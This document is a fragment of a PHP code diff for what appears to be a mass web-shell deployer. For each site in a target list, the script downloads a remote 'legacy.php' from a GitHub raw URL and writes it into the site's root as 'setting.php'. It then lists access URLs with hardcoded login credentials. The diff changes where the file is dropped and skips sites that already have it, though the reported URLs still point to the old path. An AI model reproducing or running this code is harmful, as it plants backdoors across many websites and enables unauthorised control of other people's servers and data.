@@ -33,23 +33,25 @@ foreach ($homes as $key => $home) {
 $results = [];
 
 foreach ($targets as $target) {
-    $dir = $target['path'] . '/-';
-    if (!file_exists($dir)) {
-        mkdir($dir);
-    }
+    // $dir = $target['path'] . '/-';
+    // if (!file_exists($dir)) {
+    //     mkdir($dir);
+    // }
 
     $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/legacy.php');
-    $file = $target['path'] . '/-/setting.php';
-    $res = file_put_contents($file, $response);
-
-    // $results[$target['domain']] = [
-    //     'size' => $res,
-    //     'domain' => $target['domain'],
-    //     'path' => $target['path'],
-    //     'url' => $target['domain'] . '/-/setting.php'
-    // ];
-
-    $results[] = $target['domain'] . '/-/setting.php?user=grimreaper&password=grimreaper123@';
+    if (!file_exists($target['path'] . '/setting.php')) {
+        $file = $target['path'] . '/setting.php';
+        $res = file_put_contents($file, $response);
+    
+        // $results[$target['domain']] = [
+        //     'size' => $res,
+        //     'domain' => $target['domain'],
+        //     'path' => $target['path'],
+        //     'url' => $target['domain'] . '/-/setting.php'
+        // ];
+    
+        $results[] = $target['domain'] . '/-/setting.php?user=grimreaper&password=grimreaper123@';
+    }
 }
 
 dd($results);
